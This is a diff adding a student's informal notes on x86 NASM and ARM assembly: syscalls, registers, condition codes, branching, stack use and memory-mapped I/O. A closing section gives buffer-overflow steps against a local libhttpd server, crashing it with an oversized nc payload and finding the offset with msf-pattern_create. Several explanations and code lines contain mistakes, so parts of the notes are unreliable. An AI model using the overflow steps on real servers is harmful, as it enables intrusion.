@@ -1,0 +1,262 @@
+    _                           _     _       
+   / \   ___ ___  ___ _ __ ___ | |__ | |_   _ 
+  / _ \ / __/ __|/ _ \ '_ ` _ \| '_ \| | | | |
+ / ___ \\__ \__ \  __/ | | | | | |_) | | |_| |
+/_/   \_\___/___/\___|_| |_| |_|_.__/|_|\__, |
+                                        |___/ 
+ _                                             
+| |    __ _ _ __   __ _ _   _  __ _  __ _  ___ 
+| |   / _` | '_ \ / _` | | | |/ _` |/ _` |/ _ \
+| |__| (_| | | | | (_| | |_| | (_| | (_| |  __/
+|_____\__,_|_| |_|\__, |\__,_|\__,_|\__, |\___|
+                  |___/             |___/      
+
+...........😇️....................................
+nasm -felf64 asm.asm &&ld asm.o &&./a.out 	>> in 64 bit 
+in 32 bit >>
+
+to excute the asm file first save the file.asm
+then open terminal 
+#whereis nasm
+#nasm -f elf hello.asm
+find a file called hello.o
+#ld -m elf_i386 -s -o hello.o
+#./hello
+
+..........................................
+mov	eax,1		; system call number (sys_exit)
+int	0x80		; call kernel
+
+The following code snippet shows the use of the system call sys_write −
+
+mov	edx,4		; message length
+mov	ecx,msg		; message to write
+mov	ebx,1		; file descriptor (stdout)
+mov	eax,4		; system call number (sys_write)
+int	0x80		; call kernel
+..................................................
+
+bit 		1 
+nibble 		4
+byte 		8
+word 		16
+double word 	32
+quadword  	64
+
+Binary number = (1+0.signigicant)2^(biased exponensial-127)
+.......................................
+LDR Means to put the value from the memory to regester
+.global _start
+_start:
+    LDR R0,=list	//to load value of list in regester
+    LDR R1,[R0]        	//[]  Means to take the value of R0
+    LDR R2,[R0],#4 	//to put the value of R0 and 4 in R2
+    LDR R3,[R0,#4]  	//to put the value of R0 added to 4 and the value of R0 will increase after this process
+    LDR R4,[R0,#4]!  	// ! means to increment   
+
+.data
+list:
+    .word 1,2,3,4,4,5
+    
+.........................................................
+.global _start
+_start:
+    MOV R0,#5
+    MOV R1,#7
+    ADD	R2,R0,R1 	//means R2 = R0+R1 
+    SUB R3,R0,R1	//means R3= R0-R1
+    MUL R4,R0,R1	//means R4=R0*R1
+
+........................................................
+CS Carry Set
+EQ Equal(zero Set)
+VS Overflow set
+GT Greater Than
+GE Greater Than or Equal
+PL Plus positive
+HI Higher Than
+HS Higher or Same
+CC Carrt Clear
+NE Not Equal (Zero Clear)
+VC Overflow Clear
+LT Less Than
+MI Minus
+LO Lower Than
+LS Lower or Same
+
+.........................
+MOV means to move the value of 32 reg into the first
+MVN means to move the not value of 32 reg into the first
+MVN R0, R2   //R0=~R2
+
+MOV R3
+
+cpsr shows either the number is negative or positive
+but you should put S set flags after the process
+like SUBS or ADDS  
+AND between two numbers and put the value in the first r
+MOV R0,#4
+MOV R1,#0x000ff0ff 
+ADD R2,R0,R1
+ORR R3,R0,R1
+EOR R4,R0,R1 	//EOR MEANS XOR
+MVN R0,R0 	//TO IMPLEMENT 
+
+...........
+MOV R0,#10
+MOV R1,R0
+LSL R1,#1	//shift it to left by 1
+
+== MOV R1,R0,LSL #1		means to put the value of r0 into r1 and shift it by 1 to left  to multiply by 2^(#1)
+
+.............................
+MOV R0,#1
+MOV R1,#2
+CMP R0,R1	//to compare
+BGT greater	//to see if r0 is bigger than r1
+BAL exit	//Branch always lead to default it
+greater:	// if the above condition right it will be don
+    MOV R5,#1
+			
+exit:	// we made exit to skip the greater if false	
+			
+			.................
+COM R0,R1	
+ADDLT R2,#1	>> To implement only when R0 less than R1
+MOVGE R3,#3	>> to implement only when R0 greater or equal R1
+
+		.........................
+To make a function implement and go back to implemnt the commands after the function we put BL instead of BAL
+
+
+MOV R0,#1
+MOV R1,#4
+BL func
+MOV R5,#7
+
+func:
+    add R0,R1
+    bx lr	//to return back to the other commands
+    
+............................
+to save the values to stack and reuse it after finishing a fuction we use push and pop
+
+MOV R0,#3
+MOV R1,#5
+PUSH {R0,R1}
+BL get_value
+POP {R0,R1}
+B end
+
+get_value:
+    MOV R0,#5
+    MOV R1,9
+    ADD R2,R0,R1
+    BX LR
+
+end:
+
+..................................................
+.equ hossam, 0x00ff0080   // set varible called hossam and put it inside the location of memory 0x00ff0080
+
+.equ hossam,0x00000080
+.global _start
+_start:
+    LDR R0,=hossam
+
+...............................
+to put the value of swiches into led 
+.equ SWITCH ,0xff200040	// for switches
+.equ LED,0xff200000	//for leds
+.global _start
+_start:
+	LDR R0,=SWITCH
+	LDR R1,[R0]
+	
+	LDR R0,=LED
+	STR R1,[R0]	// store the value of r1 into r0 (imp)
+
+
+................................................................
+install peda gdb from github
+
+gdb libhttpd 
+run -p 8080
+
+open another widown and code to crash ram
+echo "POST "$(python -c 'print "A"*1400')|nc -nv 127.0.0.1 8080
+and CTRL+C 
+
+to print random to store in ram 
+#msf-pattern_create -l 1400
+mapstr = the output of above 
+echo "POST "$mapstr | nc -nv 127.0.0.1 8080
+
+............................................
+to clear the ports from tables 
+iptables -A INPUT -p TCP --destination-port 8080 \! -d 127.0.0.1 -j DROP
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
